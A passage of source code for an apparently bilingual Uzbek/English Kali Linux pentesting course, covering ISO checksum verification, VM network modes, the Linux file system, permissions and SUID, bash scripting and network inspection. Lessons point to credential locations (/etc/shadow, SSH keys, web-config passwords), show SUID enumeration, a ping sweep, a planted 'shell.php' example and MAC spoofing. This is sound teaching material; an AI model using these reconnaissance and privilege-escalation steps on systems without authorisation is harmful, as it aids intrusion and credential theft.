      {icon:"🔄",text:{uz:"sudo apt update && sudo apt full-upgrade",en:"sudo apt update && sudo apt full-upgrade"}},
      {icon:"📸",text:{uz:"Snapshot olish — toza holatga qaytish uchun",en:"Take a snapshot — to revert to a clean state"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Yuklab olishni tekshirish nima uchun muhim","Why verifying the download matters")),
    React.createElement(P,null,t(lang,"ISO faylni yuklab olgach, uning SHA256 summasini hisoblab, rasmiy saytdagi summa bilan solishtiring. Nega? Chunki ISO yuklanish paytida buzilishi mumkin, yoki hujumchi soxta, zararli ISO'ni tarqatgan bo'lishi mumkin. Summalar bir xil bo'lsa — fayl aynan Kali jamoasi chiqargani, o'zgartirilmagan. Bu — o'rnatuvchiga ishonishning yagona ishonchli yo'li. Qo'shimcha xavfsizlik uchun GPG imzosini ham tekshirish mumkin.","After downloading the ISO, compute its SHA256 checksum and compare it to the one on the official site. Why? Because the ISO can get corrupted during download, or an attacker may distribute a fake, malicious ISO. If the sums match, the file is exactly what the Kali team released, unaltered. This is the only reliable way to trust the installer. For extra safety you can also verify the GPG signature.")),
    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: ISO tasdiqlandimi yoki buzilganmi?","Interactive simulator: is the ISO verified or tampered?")),
    React.createElement(P,null,t(lang,"Ikkala ssenariyni sinang — hash tekshiruvi haqiqiy ISO va shubhali ISO'ni qanday farqlashini ko'ring:","Try both scenarios — see how a checksum check tells a genuine ISO apart from a suspicious one:")),
    React.createElement(ISOVerifySim),
    React.createElement(H2,{num:"§5"},t(lang,"O'rnatishdan keyingi birinchi qadamlar","First steps after install")),
    React.createElement(P,null,t(lang,"O'rnatgach: (1) tizimni yangilang — vositalar so'nggi versiyada bo'lsin; (2) standart parolni o'zgartiring; (3) VM'da darhol snapshot oling; (4) kerak bo'lsa qo'shimcha vositalarni metapaketlar orqali o'rnating (masalan kali-linux-large). Bu odatlar ishingizni xavfsiz va tartibli qiladi.","After install: (1) update the system so tools are current; (2) change the default password; (3) take a snapshot immediately in a VM; (4) install extra tools via metapackages if needed (e.g. kali-linux-large). These habits keep your work safe and organized.")),
    React.createElement(H2,{num:"§6"},t(lang,"VM tarmoq rejimlari","VM network modes")),
    React.createElement(P,null,t(lang,"VirtualBox'da tarmoqni to'g'ri sozlash muhim. NAT — Kali internetga chiqadi, lekin tashqaridan ko'rinmaydi (xavfsiz, sukut bo'yicha). Bridged — Kali haqiqiy tarmoqda alohida qurilmadek ko'rinadi (real tarmoqni test qilish uchun). Host-only — faqat sizning mashinangiz va VM'lar orasidagi izolyatsiya qilingan tarmoq (nishon VM bilan xavfsiz mashq uchun ideal).","Configuring the VM network correctly matters. NAT — Kali reaches the internet but isn't visible from outside (safe, the default). Bridged — Kali appears as a separate device on the real network (for testing a real LAN). Host-only — an isolated network between just your machine and the VMs (ideal for safe practice against a target VM).")),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"Snapshot: toza o'rnatishdan keyin darhol snapshot oling. Test muhitini ifloslasangiz yoki biror narsa buzilsa, bir soniyada toza holatga qaytasiz — hech narsani qayta o'rnatmasdan.","Snapshot: take one right after a clean install. If you pollute your test environment or something breaks, you revert to a clean state in a second — without reinstalling anything.")),
    React.createElement(H2,{num:"§7"},t(lang,"VM tarmoq rejimlarini solishtirish","Comparing VM network modes")),
    React.createElement(P,null,t(lang,"Laboratoriya qurishda tarmoq rejimini to'g'ri tanlash xavfsizlikni belgilaydi. Quyida ikkita eng ko'p ishlatiladigan rejim solishtirilgan — mashq uchun odatda Host-only + NAT birgalikda ishlatiladi.","When building a lab, choosing the right network mode defines your safety. Below are the two most-used modes compared — for practice, Host-only + NAT together is the usual setup.")),
    React.createElement(CompareCols,{left:{title:{uz:"NAT",en:"NAT"},color:"#69db7c",rows:[{uz:"Kali internetga chiqadi",en:"Kali reaches the internet"},{uz:"Tashqaridan ko'rinmaydi",en:"Invisible from outside"},{uz:"Sukut bo'yicha, xavfsiz",en:"Default, safe"},]},right:{title:{uz:"Bridged",en:"Bridged"},color:"#ff3a5e",rows:[{uz:"Real tarmoqda alohida qurilma",en:"A separate device on the LAN"},{uz:"Boshqalar ko'ra oladi",en:"Others can see it"},{uz:"Faqat ruxsat berilgan tarmoqda",en:"Only on an authorized network"},]}}),
    React.createElement(H2,{num:"§8"},t(lang,"Amaliyot: ISO ni tekshirish","Practice: verify the ISO")),
    React.createElement(P,null,t(lang,"Simulyatordagi «Rasmiy ISO» ssenariysi aynan shu buyruqqa asoslangan. ISO yuklab olingach, uning SHA256 summasini hisoblang va kali.org dagi rasmiy qiymat bilan solishtiring.","The simulator's «Official ISO» scenario is based on exactly this command. After downloading the ISO, compute its SHA256 sum and compare it to the official value on kali.org.")),
    React.createElement(Terminal,null,"sha256sum kali-linux-2024.1-installer-amd64.iso\n# 3c3e1e9... (bu qiymat kali.org dagi bilan BIR XIL bo'lishi shart)\n\nsudo apt update && sudo apt full-upgrade -y\n# ... Reading package lists... Done"),
    React.createElement(Quiz,{q:{uz:"Yangi boshlovchi uchun eng xavfsiz o'rnatish usuli qaysi?",en:"Safest install method for a beginner?"},opts:[{uz:"Bare metal",en:"Bare metal"},{uz:"Virtual mashina",en:"Virtual machine"},{uz:"Telefonga",en:"On a phone"},{uz:"Router'ga",en:"On a router"}],correct:1,exp:{uz:"Virtual mashina asosiy tizimni izolyatsiya qiladi va snapshot orqali xatolardan bir soniyada qaytish imkonini beradi.",en:"A VM isolates the host and lets you revert from mistakes in a second via snapshots."}}));
}
function LessonL04(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Linux fayl tizimi (FHS)","The Linux file system (FHS)")),
    React.createElement(P,null,t(lang,"Windows'dan farqli, Linux'da C: yoki D: disklari yo'q. Hamma narsa yagona ildizdan (/) boshlanadi va daraxt shaklida tarmoqlanadi. Hatto USB yoki qattiq disk ham shu daraxtning bir papkasiga \"ulanadi\" (mount qilinadi). Bu tuzilma FHS (Filesystem Hierarchy Standard) deb ataladi va deyarli barcha Linux tizimlarida bir xil — shuning uchun bir marta o'rgansangiz, hamma joyda foydali.","Unlike Windows, Linux has no C: or D: drives. Everything starts from a single root (/) and branches out as a tree. Even a USB or hard disk is \"attached\" (mounted) to a folder in that tree. This structure is the FHS (Filesystem Hierarchy Standard) and is nearly identical across Linux systems — so learning it once helps everywhere.")),
    React.createElement(H2,{num:"§2"},t(lang,"Asosiy kataloglar","The key directories")),
    React.createElement(LayerStack,{layers:[
      {n:"/etc",name:t(lang,"Sozlamalar","Config"),color:"#ff6b6b",desc:{uz:"Tizim sozlama fayllari — passwd, shadow, tarmoq, xizmatlar.",en:"System config files — passwd, shadow, network, services."}},
      {n:"/home",name:t(lang,"Foydalanuvchilar","Users"),color:"#ffa94d",desc:{uz:"Oddiy foydalanuvchilarning shaxsiy kataloglari (/home/aziz).",en:"Home directories of normal users (/home/alice)."}},
      {n:"/root",name:"root",color:"#ffd43b",desc:{uz:"root superfoydalanuvchining uy katalogi (/home dan alohida).",en:"The root superuser's home (separate from /home)."}},
      {n:"/var",name:t(lang,"O'zgaruvchan","Variable"),color:"#69db7c",desc:{uz:"Loglar (/var/log/auth.log), veb (/var/www), pochta.",en:"Logs (/var/log/auth.log), web (/var/www), mail."}},
      {n:"/usr",name:t(lang,"Dasturlar","Programs"),color:"#4dabf7",desc:{uz:"Foydalanuvchi dasturlari, lug'atlar (/usr/share/wordlists).",en:"User programs, wordlists (/usr/share/wordlists)."}},
      {n:"/tmp",name:t(lang,"Vaqtinchalik","Temporary"),color:"#a855f7",desc:{uz:"Vaqtinchalik fayllar; ko'pincha hammaga yozish — privescda foydali.",en:"Temporary files; often world-writable — handy in privesc."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Pentester uchun nega muhim?","Why it matters to a pentester")),
    React.createElement(P,null,t(lang,"Nishon tizimga kirganingizda qayerga qarash kerakligini bilish vaqtni tejaydi. /etc/passwd barcha foydalanuvchilarni sanaydi (hamma o'qiy oladi). /etc/shadow parol hashlarini saqlaydi (faqat root). /var/log/ hujum izlari va kirish urinishlarini yozadi. /home/*/.ssh/ SSH kalitlarini saqlaydi. /var/www/ veb-sayt kodini (ko'pincha ma'lumotlar bazasi parollari bilan) o'z ichiga oladi. Tajribali pentester bu joylarni birinchi bo'lib tekshiradi.","Once you're on a target system, knowing where to look saves time. /etc/passwd lists all users (world-readable). /etc/shadow stores password hashes (root only). /var/log/ records attack traces and login attempts. /home/*/.ssh/ holds SSH keys. /var/www/ contains website code (often with database passwords). An experienced pentester checks these places first.")),
    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: oddiy foydalanuvchi vs root","Interactive simulator: regular user vs root")),
    React.createElement(P,null,t(lang,"Xuddi shu uchta buyruqni ikki xil huquq bilan sinang — fayl tizimidagi «ko'rinmas devor» qayerda ekanini his qiling:","Try the exact same three commands with two different privilege levels — feel exactly where the file system's «invisible wall» sits:")),
    React.createElement(PermissionWalkSim),
    React.createElement(H2,{num:"§5"},t(lang,"Mutlaq va nisbiy yo'llar","Absolute vs relative paths")),
    React.createElement(P,null,t(lang,"Mutlaq yo'l ildizdan boshlanadi (/etc/passwd) — qayerda turganingizdan qat'i nazar bir xil joyni bildiradi. Nisbiy yo'l joriy katalogdan boshlanadi (../logs yoki ./script.sh). . joriy katalog, .. bitta yuqori, ~ uy katalogi. Skript yozayotganda mutlaq yo'llar ishonchliroq, chunki ular kutilmagan joyga olib bormaydi.","An absolute path starts from root (/etc/passwd) — it means the same place no matter where you are. A relative path starts from the current directory (../logs or ./script.sh). . is the current dir, .. one up, ~ the home directory. When writing scripts, absolute paths are safer because they never lead somewhere unexpected.")),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"Yashirin fayllar: nomi nuqta (.) bilan boshlanadigan fayllar yashirin (.bashrc, .ssh). Ularni ko'rish uchun ls -a ishlating — ular ko'pincha SSH kalitlari, konfiguratsiya va maxfiy ma'lumot saqlaydi.","Hidden files: files whose names start with a dot (.) are hidden (.bashrc, .ssh). Use ls -a to see them — they often hold SSH keys, config and sensitive data.")),
    React.createElement(H2,{num:"§6"},t(lang,"Mutlaq va nisbiy yo'l — solishtirish","Absolute vs relative path — compared")),
    React.createElement(CompareCols,{left:{title:{uz:"Mutlaq yo'l",en:"Absolute path"},color:"#4dabf7",rows:[{uz:"/ ildizdan boshlanadi",en:"Starts from the root /"},{uz:"Har doim bir xil joy",en:"Always the same place"},{uz:"Skriptlarda ishonchli",en:"Reliable in scripts"},]},right:{title:{uz:"Nisbiy yo'l",en:"Relative path"},color:"#a855f7",rows:[{uz:"Joriy katalogdan",en:"From the current directory"},{uz:". va .. ishlatiladi",en:"Uses . and .."},{uz:"Qisqa, lekin kontekstga bog'liq",en:"Short but context-dependent"},]}}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: fayl tizimini aylanish","Practice: walking the file system")),
    React.createElement(P,null,t(lang,"Ildizdan boshlab tizimning asosiy papkalarini ko'ramiz. pwd qayerdaligimizni, ls / ildizdagi papkalarni ko'rsatadi.","Starting from the root we look at the system's main folders. pwd shows where we are, ls / shows the folders at the root.")),
    React.createElement(Terminal,null,"pwd\n# /home/kali\nls /\n# bin  boot  dev  etc  home  lib  media  mnt  opt\n# proc root  run  sbin srv  sys  tmp  usr  var\ncd /var/log && ls\n# auth.log  syslog  apache2  ..."),
    React.createElement(Quiz,{q:{uz:"Parol hashlari qaysi faylda va uni kim o'qiy oladi?",en:"Which file stores password hashes and who can read it?"},opts:[{uz:"/etc/passwd — hamma",en:"/etc/passwd — everyone"},{uz:"/etc/shadow — faqat root",en:"/etc/shadow — only root"},{uz:"/var/log — hamma",en:"/var/log — everyone"},{uz:"/home — mehmonlar",en:"/home — guests"}],correct:1,exp:{uz:"/etc/shadow parol hashlarini saqlaydi va faqat root o'qiy oladi; /etc/passwd esa foydalanuvchilar ro'yxatini saqlaydi va hamma o'qiy oladi.",en:"/etc/shadow stores password hashes and is readable only by root; /etc/passwd holds the user list and is world-readable."}}));
}
function LessonL05(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Foydalanuvchilar va guruhlar","Users and groups")),
    React.createElement(P,null,t(lang,"Linux — ko'p foydalanuvchili tizim. Har bir foydalanuvchining raqamli identifikatori (UID) va bir yoki bir necha guruhi bor. root (UID 0) — cheklovsiz superfoydalanuvchi: u hamma narsani qila oladi. /etc/passwd har foydalanuvchi haqida bir qator saqlaydi: nom, UID, GID, uy katalogi va login qobig'i. Pentestda asosiy maqsad ko'pincha oddiy foydalanuvchidan root'ga ko'tarilish — bu privilege escalation deyiladi (L29).","Linux is a multi-user system. Each user has a numeric identifier (UID) and one or more groups. root (UID 0) is the unrestricted superuser: it can do anything. /etc/passwd stores one line per user: name, UID, GID, home directory and login shell. In a pentest the main goal is often to rise from a normal user to root — this is privilege escalation (L29).")),
    React.createElement(H2,{num:"§2"},t(lang,"Ruxsatlarni o'qish (rwx)","Reading permissions (rwx)")),
    React.createElement(LayerStack,{layers:[
      {n:"r",name:t(lang,"Read — o'qish (4)","Read (4)"),color:"#4dabf7",desc:{uz:"Fayl mazmunini ko'rish yoki katalog ro'yxatini olish.",en:"View the file's contents or list a directory."}},
      {n:"w",name:t(lang,"Write — yozish (2)","Write (2)"),color:"#69db7c",desc:{uz:"Faylni o'zgartirish yoki katalogda fayl yaratish/o'chirish.",en:"Modify a file or create/delete files in a directory."}},
      {n:"x",name:t(lang,"eXecute — bajarish (1)","eXecute (1)"),color:"#a855f7",desc:{uz:"Faylni dastur sifatida ishga tushirish; katalogga kirish.",en:"Run the file as a program; enter a directory."}},
      {n:"S",name:"SUID / SGID",color:"#ff3a5e",desc:{uz:"Fayl egasining (ko'pincha root) huquqi bilan ishlaydi — privesc yo'li.",en:"Runs with the owner's (often root) rights — a privesc path."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Sakkizlik (octal) matematika","Octal math")),
    React.createElement(P,null,t(lang,"chmod'dagi raqamlar (masalan 755) aslida ruxsatlarning yig'indisidir. Har raqam bitta guruh uchun: birinchi — egasi, ikkinchi — guruh, uchinchi — boshqalar. Har raqam r=4, w=2, x=1 ni qo'shish orqali hosil bo'ladi. Masalan 7 = 4+2+1 = rwx (hamma huquq), 5 = 4+1 = r-x (o'qish+bajarish), 6 = 4+2 = rw- (o'qish+yozish). Shunday qilib 755 = rwxr-xr-x, 644 = rw-r--r--, 600 = rw------- (faqat egasi).","The numbers in chmod (like 755) are actually a sum of permissions. Each digit is for one group: first — owner, second — group, third — others. Each digit is formed by adding r=4, w=2, x=1. For example 7 = 4+2+1 = rwx (all), 5 = 4+1 = r-x (read+execute), 6 = 4+2 = rw- (read+write). So 755 = rwxr-xr-x, 644 = rw-r--r--, 600 = rw------- (owner only).")),
    React.createElement(H2,{num:"§4"},t(lang,"chmod, chown va amaliyot","chmod, chown and practice")),
    React.createElement(P,null,t(lang,"chmod ruxsatlarni o'zgartiradi (chmod 600 id_rsa yoki chmod +x script.sh). chown fayl egasini o'zgartiradi (chown user:group file). Bu buyruqlar xavfsizlik uchun juda muhim: masalan SSH shaxsiy kaliti (id_rsa) 600 bo'lishi shart — aks holda SSH uni rad etadi, chunki boshqalar o'qiy oladigan kalit xavfli.","chmod changes permissions (chmod 600 id_rsa or chmod +x script.sh). chown changes the file's owner (chown user:group file). These commands are vital for security: for instance an SSH private key (id_rsa) must be 600 — otherwise SSH refuses it, because a key others can read is dangerous.")),
    React.createElement(H2,{num:"§5"},t(lang,"SUID, SGID va sudo","SUID, SGID and sudo")),
    React.createElement(P,null,t(lang,"SUID biti o'rnatilgan fayl egasining huquqi bilan ishlaydi — agar egasi root bo'lsa, oddiy foydalanuvchi ham uni root huquqida bajaradi. Bu ba'zan zarur (masalan passwd buyrug'i), lekin noto'g'ri sozlangan SUID fayllar privilege escalation uchun eng ko'p ishlatiladigan yo'ldir. sudo esa oddiy foydalanuvchiga vaqtincha root buyrug'ini bajarishga ruxsat beradi. sudo -l — sizga qanday sudo huquqlari berilganini ko'rsatadi (privescning birinchi tekshiruvi).","A file with the SUID bit set runs with the owner's rights — if the owner is root, even a normal user runs it as root. This is sometimes necessary (e.g. the passwd command), but misconfigured SUID files are the most common path for privilege escalation. sudo lets a normal user run a command temporarily as root. sudo -l shows what sudo rights you've been given (the first privesc check).")),
    React.createElement(Terminal,null,"chmod 600 id_rsa       # rw------- (SSH kaliti uchun majburiy)\nchmod +x exploit.sh    # bajarish huquqi\nchown www-data:www-data shell.php\nsudo -l                # menda qanday sudo huquqi bor?\nfind / -perm -4000 -type f 2>/dev/null  # SUID fayllar"),
    React.createElement(H2,{num:"§6"},t(lang,"Interaktiv simulyator: xavfsiz vs xavfli SUID","Interactive simulator: safe vs risky SUID")),
    React.createElement(P,null,t(lang,"Bir xil SUID biti ikki xil dasturda tubdan boshqacha oqibatga olib keladi. Ikkalasini sinang:","The same SUID bit leads to a wildly different outcome depending on the program. Try both:")),
    React.createElement(SUIDRiskSim),
    React.createElement(H2,{num:"§7"},t(lang,"Sakkizlik va simvolik — ikki usul","Octal vs symbolic — two ways")),
    React.createElement(CompareCols,{left:{title:{uz:"Sakkizlik (raqam)",en:"Octal (number)"},color:"#ffd43b",rows:[{uz:"chmod 755 file",en:"chmod 755 file"},{uz:"Bir martaga to'liq o'rnatadi",en:"Sets everything at once"},{uz:"r=4 w=2 x=1 yig'indisi",en:"Sum of r=4 w=2 x=1"},]},right:{title:{uz:"Simvolik (harf)",en:"Symbolic (letter)"},color:"#69db7c",rows:[{uz:"chmod u+x file",en:"chmod u+x file"},{uz:"Bittasini qo'shadi/olib tashlaydi",en:"Adds/removes just one bit"},{uz:"u/g/o + r/w/x",en:"u/g/o + r/w/x"},]}}),
    React.createElement(H2,{num:"§8"},t(lang,"Amaliyot: ruxsatlarni o'qish","Practice: reading permissions")),
    React.createElement(P,null,t(lang,"ls -l birinchi ustunida 10 belgi ruxsatlarni ko'rsatadi: birinchi belgi tur (- fayl, d katalog), keyin uch-uchdan egasi, guruh va boshqalar uchun rwx. Quyidagi natijani o'qishga harakat qiling.","The first column of ls -l shows permissions in 10 characters: the first is the type (- file, d directory), then three-by-three rwx for owner, group and others. Try reading the output below.")),
    React.createElement(Terminal,null,"ls -l\n# -rw-------  1 kali kali 2610 id_rsa      → 600, faqat egasi (SSH kaliti)\n# -rwxr-xr-x  1 kali kali  180 exploit.sh  → 755, hamma bajaradi\n# -rw-r--r--  1 root root 2981 passwd      → 644, hamma o'qiydi\nfind / -perm -4000 -type f 2>/dev/null\n# /usr/bin/passwd  /usr/bin/sudo  ...  (SUID fayllar)"),
    React.createElement(Quiz,{q:{uz:"chmod 600 id_rsa faylga qanday ruxsat beradi?",en:"What does chmod 600 id_rsa set?"},opts:[{uz:"Hamma o'qiy/yoza oladi",en:"Everyone read/write"},{uz:"Faqat egasi o'qiy/yoza oladi",en:"Only the owner read/write"},{uz:"Hamma bajara oladi",en:"Everyone execute"},{uz:"Hech kim kira olmaydi",en:"No access"}],correct:1,exp:{uz:"600 = rw------- : 6 (rw) egasiga, 0 guruhga, 0 boshqalarga. SSH kalitlari uchun aynan shu talab qilinadi.",en:"600 = rw------- : 6 (rw) for owner, 0 for group, 0 for others. Exactly what SSH keys require."}}));
}
function LessonL07(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Nega bash skript?","Why bash scripting?")),
    React.createElement(P,null,t(lang,"Bash skript — bir nechta buyruqni bitta faylga jamlab, avtomatik ketma-ket bajarish usuli. Pentestda takrorlanuvchi vazifalarni — 254 ta IP ni tekshirish, natijalarni saralash, bir necha vositani zanjirlab ishga tushirish — avtomatlashtiradi. Qo'lda 10 daqiqa ketadigan ish skript bilan 10 soniyada bajariladi, va xatosiz takrorlanadi.","A bash script bundles several commands into one file and runs them automatically in sequence. In a pentest it automates repetitive tasks — checking 254 IPs, sorting results, chaining several tools. A job that takes 10 minutes by hand runs in 10 seconds with a script, and repeats without errors.")),
    React.createElement(H2,{num:"§2"},t(lang,"Skript qanday ishlaydi","How a script runs")),
    React.createElement(FlowSteps,{title:{uz:"Skriptni yaratish va ishga tushirish",en:"Creating and running a script"},steps:[
      {icon:"#!",text:{uz:"Birinchi qator: #!/bin/bash (shebang)",en:"First line: #!/bin/bash (shebang)"}},
      {icon:"📦",text:{uz:"O'zgaruvchilar va shartlar yoziladi",en:"Variables and conditions are written"}},
      {icon:"🔁",text:{uz:"Sikl (for/while) bilan takror amal",en:"A loop (for/while) repeats an action"}},
      {icon:"🔓",text:{uz:"chmod +x scan.sh — bajarish huquqi berish",en:"chmod +x scan.sh — grant execute permission"}},
      {icon:"▶",text:{uz:"./scan.sh — ishga tushirish",en:"./scan.sh — run it"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"O'zgaruvchilar va qo'shtirnoq","Variables and quoting")),
    React.createElement(P,null,t(lang,"O'zgaruvchi qiymatni saqlaydi: TARGET=\"10.0.0.5\" (tenglik atrofida bo'sh joy YO'Q — bu keng tarqalgan xato). Qiymatni ishlatish uchun $ qo'yiladi: echo $TARGET. Buyruq chiqishini o'zgaruvchiga olish uchun $(...) ishlatiladi: HOSTS=$(cat targets.txt). Qo'shtirnoq muhim: \"$VAR\" bo'sh joyli qiymatlarni saqlaydi, $VAR (tirnoqsiz) ularni bo'lib yuborishi mumkin.","A variable stores a value: TARGET=\"10.0.0.5\" (NO spaces around the equals sign — a common mistake). To use the value, prefix with $: echo $TARGET. To capture a command's output into a variable, use $(...): HOSTS=$(cat targets.txt). Quoting matters: \"$VAR\" preserves values with spaces, while $VAR (unquoted) can split them.")),
    React.createElement(H2,{num:"§4"},t(lang,"Shartlar va sikllar","Conditions and loops")),
    React.createElement(P,null,t(lang,"Shart (if) qarorlar qabul qiladi: if ping -c1 $ip &>/dev/null; then ... fi — xost tirik bo'lsa bir ish, aks holda (else) boshqa ish. Sikllar takrorlaydi: for i in $(seq 1 254); do ... done — 1 dan 254 gacha aylanadi; while [ shart ]; do ... done — shart to'g'ri ekan davom etadi. Bu ikki tuzilma pentest skriptlarining asosidir.","A condition (if) makes decisions: if ping -c1 $ip &>/dev/null; then ... fi — do one thing if the host is alive, else another. Loops repeat: for i in $(seq 1 254); do ... done — iterates 1 to 254; while [ condition ]; do ... done — continues while the condition holds. These two structures are the backbone of pentest scripts.")),
    React.createElement(H2,{num:"§5"},t(lang,"Amaliy recon skripti","A practical recon script")),
    React.createElement(P,null,t(lang,"Quyidagi skript butun /24 tarmoqni tekshirib, tirik xostlarni topadi. seq 1 254 raqamlarni beradi, sikl har IP ni yasaydi, ping bilan sinaydi, muvaffaqiyatli bo'lsa ekranga chiqaradi. Skriptni saqlab, chmod +x bilan bajariladigan qilib, ./scan.sh bilan ishga tushirasiz.","The script below scans an entire /24 network to find live hosts. seq 1 254 produces the numbers, the loop builds each IP, ping tests it, and prints it on success. You save the script, make it executable with chmod +x, and run it with ./scan.sh.")),
    React.createElement(Terminal,null,"#!/bin/bash\n# ^ shebang — skript bash bilan ishga tushadi\nfor i in $(seq 1 254); do\n  ip=\"10.0.0.$i\"\n  ping -c1 -W1 $ip &>/dev/null && echo \"$ip tirik\"\ndone\n\n# ishga tushirish:\n# chmod +x scan.sh && ./scan.sh"),
    React.createElement(H2,{num:"§6"},t(lang,"Bash qurilishlari","Bash building blocks")),
    React.createElement(LayerStack,{layers:[{n:"$var",name:t(lang,"$var","$var"),color:"#4dabf7",desc:{uz:"O'zgaruvchi qiymati (ikki qo'shtirnoq ichida kengayadi).",en:"Variable value (expands inside double quotes)."}},{n:"if",name:t(lang,"if","if"),color:"#69db7c",desc:{uz:"Shart: [ -f file ] fayl bor-yo'qligini tekshiradi.",en:"Condition: [ -f file ] tests if a file exists."}},{n:"for",name:t(lang,"for","for"),color:"#a855f7",desc:{uz:"Sikl: ro'yxatdagi har element ustidan takrorlaydi.",en:"Loop: iterates over each item in a list."}},{n:"$( )",name:t(lang,"$( )","$( )"),color:"#ffd43b",desc:{uz:"Buyruq natijasini o'zgaruvchiga oladi.",en:"Captures a command's output into a variable."}},]}),
    React.createElement(H2,{num:"§7"},t(lang,"Interaktiv simulyator: qo'lda vs skript bilan","Interactive simulator: by hand vs with a script")),
    React.createElement(P,null,t(lang,"§1 dagi da'voni his qiling — xuddi shu /24 tarmoqni tekshirish vazifasini qo'lda va bitta skript bilan bajarishni solishtiring:","Feel the claim from §1 for yourself — compare doing the same /24 network check by hand versus with one script:")),
    React.createElement(ManualVsScriptSim),
    React.createElement(Quiz,{q:{uz:"Skriptning birinchi qatoridagi #!/bin/bash nima deyiladi?",en:"What is #!/bin/bash on a script's first line called?"},opts:[{uz:"Izoh",en:"A comment"},{uz:"Shebang — qaysi interpretator ishga tushirishini bildiradi",en:"Shebang — tells which interpreter runs it"},{uz:"O'zgaruvchi",en:"A variable"},{uz:"Sikl",en:"A loop"}],correct:1,exp:{uz:"Shebang (#!) tizimga skriptni qaysi dastur (bu yerda /bin/bash) bilan bajarishni ko'rsatadi — birinchi qatorda turishi shart.",en:"The shebang (#!) tells the system which program (here /bin/bash) executes the script — it must be the first line."}}));
}
function LessonL08(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Tarmoq holatini ko'rish","Inspecting the network")),
    React.createElement(P,null,t(lang,"Har qanday tarmoq hujumidan oldin o'z mashinangizning tarmoq holatini bilishingiz kerak: IP manzilingiz nima, qaysi interfeyslar bor, tashqariga chiqish yo'li (gateway) qayerda. Bu — jangdan oldin o'z pozitsiyangizni bilishdek. Kali'da buning uchun zamonaviy ip buyrug'idan foydalaniladi (eski ifconfig o'rnini bosgan).","Before any network attack you must know your own machine's network state: what your IP is, which interfaces exist, where the exit (gateway) is. It's like knowing your own position before a battle. In Kali this is done with the modern ip command (which replaced the old ifconfig).")),
    React.createElement(H2,{num:"§2"},t(lang,"Foydali buyruqlar","Useful commands")),
    React.createElement(LayerStack,{layers:[
      {n:"ip a",name:t(lang,"IP va interfeyslar","IP & interfaces"),color:"#4dabf7",desc:{uz:"O'z IP manzilingiz, MAC va tarmoq kartalari.",en:"Your IP, MAC and network cards."}},
      {n:"ip route",name:t(lang,"Marshrutlar","Routes"),color:"#69db7c",desc:{uz:"default gateway — tashqi olamga chiqish eshigi.",en:"The default gateway — the door to the outside."}},
      {n:"ss -tulnp",name:t(lang,"Ochiq portlar","Open ports"),color:"#a855f7",desc:{uz:"Sizning mashinangizda tinglayotgan xizmatlar.",en:"Services listening on your machine."}},
      {n:"ping",name:t(lang,"Ulanish sinovi","Connectivity"),color:"#ffd43b",desc:{uz:"Xost tirikligini va tarmoq ishlayotganini tekshirish.",en:"Check a host is alive and the network works."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"ip a chiqishini o'qish","Reading ip a output")),
    React.createElement(P,null,t(lang,"ip a har interfeys uchun ma'lumot beradi: lo — loopback (127.0.0.1, mashinaning o'zi), eth0 — simli, wlan0 — simsiz. Har interfeys ostida inet qatori IPv4 manzilni /24 kabi tarmoq maskasi bilan ko'rsatadi (192.168.1.10/24), inet6 esa IPv6 ni. link/ether qatori MAC manzilni beradi. \"UP\" so'zi interfeys faol ekanini bildiradi.","ip a gives info for each interface: lo — loopback (127.0.0.1, the machine itself), eth0 — wired, wlan0 — wireless. Under each interface, the inet line shows the IPv4 address with a netmask like /24 (192.168.1.10/24), and inet6 the IPv6. The link/ether line gives the MAC address. The word \"UP\" means the interface is active.")),
    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: zanjir qayerda uzilgan?","Interactive simulator: where does the chain break?")),
    React.createElement(P,null,t(lang,"Tarmoq muammosini pastdan yuqoriga qarab tekshiring: avval o'z interfeysingiz, keyin shlyuz, keyin internet, keyin DNS. Xuddi shu tekshiruv zanjiri ikki xil nuqtada uzilsa nima bo'lishini solishtiring:","Diagnose a network problem bottom-up: first your own interface, then the gateway, then the internet, then DNS. Compare what happens when that exact same check chain breaks at two different points:")),
    React.createElement(NetDiagSim),
    React.createElement(H2,{num:"§5"},t(lang,"MAC manzilni o'zgartirish","Changing the MAC address")),
    React.createElement(P,null,t(lang,"MAC manzil — tarmoq kartasining doimiy \"pasport raqami\". Anonimlik yoki MAC filtrlashni chetlab o'tish uchun uni vaqtincha o'zgartirish mumkin (macchanger bilan). Bu faqat ta'lim va ruxsat berilgan muhitda qilinadi.","The MAC address is the network card's permanent \"passport number\". For anonymity or to bypass MAC filtering, you can temporarily change it (with macchanger). Do this only in educational and authorized environments.")),
    React.createElement(Terminal,null,"ip a\nip route\nping -c4 8.8.8.8       # IP bo'yicha\nping -c4 google.com    # DNS bilan\ntraceroute google.com\n# MAC ni vaqtincha o'zgartirish:\nsudo ip link set eth0 down\nsudo macchanger -r eth0\nsudo ip link set eth0 up"),
    React.createElement(H2,{num:"§6"},t(lang,"Amaliyot: ip a chiqishini o'qish","Practice: reading ip a")),
    React.createElement(Terminal,null,"ip a\n# 2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500\n#    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0\n# 3: tun0: <POINTOPOINT,UP> — VPN interfeysi\nip route\n# default via 10.0.2.2 dev eth0   (shlyuz = 10.0.2.2)"),
